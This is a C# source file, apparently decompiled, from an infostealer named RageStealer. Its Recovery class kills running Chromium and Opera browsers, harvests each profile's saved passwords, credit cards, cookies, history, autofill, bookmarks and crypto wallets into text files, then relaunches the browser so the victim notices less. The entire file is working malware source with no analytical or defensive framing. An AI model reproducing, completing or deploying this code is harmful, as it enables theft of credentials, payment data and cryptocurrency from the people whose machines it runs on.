using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using RageStealer.Helper;
using RageStealer.Target.Crypto.Browsers;

namespace RageStealer.Target.Browsers.Chromium;

internal sealed class Recovery
{
	public static string lastbrowser = "";

	public static void KillBrowser(string sFullPath)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			try
			{
				if (process.MainModule.FileName.Contains(sFullPath))
				{
					lastbrowser = process.MainModule.FileName;
					process.Kill();
				}
			}
			catch
			{
			}
		}
	}

	public static void Run(string sSavePath, string sSavePathWallets)
	{
		for (int i = 0; i < Paths.SChromiumPswPaths.Length; i++)
		{
			try
			{
				string text = Paths.SChromiumPswPaths[i];
				KillBrowser(Paths.SChromiumPswPaths1[i]);
				if (text.Contains("Opera Software"))
				{
					string text2 = Paths.Appdata + text;
					if (Directory.Exists(text2))
					{
						string text3 = Crypto.BrowserPathToAppName(text);
						string text4 = sSavePath + "\\" + text3;
						Directory.CreateDirectory(text4);
						List<CreditCard> cCc = CreditCards.Get(text2 + "Web Data");
						List<Password> pPasswords = Passwords.Get(text2 + "Login Data");
						List<Cookie> list = null;
						list = ((!File.Exists(text2 + "Cookies")) ? Cookies.Get(text2 + "Network\\Cookies") : Cookies.Get(text2 + "Cookies"));
						List<Site> sHistory = History.Get(text2 + "History");
						List<Site> sHistory2 = Downloads.Get(text2 + "History");
						List<AutoFill> aFills = Autofill.Get(text2 + "Web Data");
						List<Bookmark> bBookmarks = Bookmarks.Get(text2 + "Bookmarks");
						Chrome.GetChromeWallets(sSavePathWallets, text2, text3);
						CBrowserUtils.WriteCreditCards(cCc, text4 + "\\CreditCards.txt");
						CBrowserUtils.WritePasswords(pPasswords, text4 + "\\Passwords.txt");
						CBrowserUtils.WriteCookies(list, text4 + "\\Cookies.txt");
						CBrowserUtils.WriteHistory(sHistory, text4 + "\\History.txt");
						CBrowserUtils.WriteHistory(sHistory2, text4 + "\\Downloads.txt");
						CBrowserUtils.WriteAutoFill(aFills, text4 + "\\AutoFill.txt");
						CBrowserUtils.WriteBookmarks(bBookmarks, text4 + "\\Bookmarks.txt");
					}
				}
				else
				{
					string text2 = Paths.Lappdata + text;
					if (Directory.Exists(text2))
					{
						string[] directories = Directory.GetDirectories(text2);
						foreach (string text5 in directories)
						{
							string text6 = Crypto.BrowserPathToAppName(text);
							string text7 = sSavePath + "\\" + text6;
							Directory.CreateDirectory(text7);
							List<CreditCard> cCc2 = CreditCards.Get(text5 + "\\Web Data");
							List<Password> pPasswords2 = Passwords.Get(text5 + "\\Login Data");
							List<Cookie> list2 = null;
							list2 = ((!File.Exists(text5 + "\\Cookies")) ? Cookies.Get(text5 + "\\Network\\Cookies") : Cookies.Get(text5 + "\\Cookies"));
							List<Site> sHistory3 = History.Get(text5 + "\\History");
							List<Site> sHistory4 = Downloads.Get(text5 + "\\History");
							List<AutoFill> aFills2 = Autofill.Get(text5 + "\\Web Data");
							List<Bookmark> bBookmarks2 = Bookmarks.Get(text5 + "\\Bookmarks");
							Chrome.GetChromeWallets(sSavePathWallets, text5, text6);
							CBrowserUtils.WriteCreditCards(cCc2, text7 + "\\CreditCards.txt");
							CBrowserUtils.WritePasswords(pPasswords2, text7 + "\\Passwords.txt");
							CBrowserUtils.WriteCookies(list2, text7 + "\\Cookies.txt");
							CBrowserUtils.WriteHistory(sHistory3, text7 + "\\History.txt");
							CBrowserUtils.WriteHistory(sHistory4, text7 + "\\Downloads.txt");
							CBrowserUtils.WriteAutoFill(aFills2, text7 + "\\AutoFill.txt");
							CBrowserUtils.WriteBookmarks(bBookmarks2, text7 + "\\Bookmarks.txt");
						}
					}
				}
				if (!string.IsNullOrEmpty(lastbrowser))
				{
					try
					{
						Process.Start(lastbrowser);
						lastbrowser = "";
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
	}
}
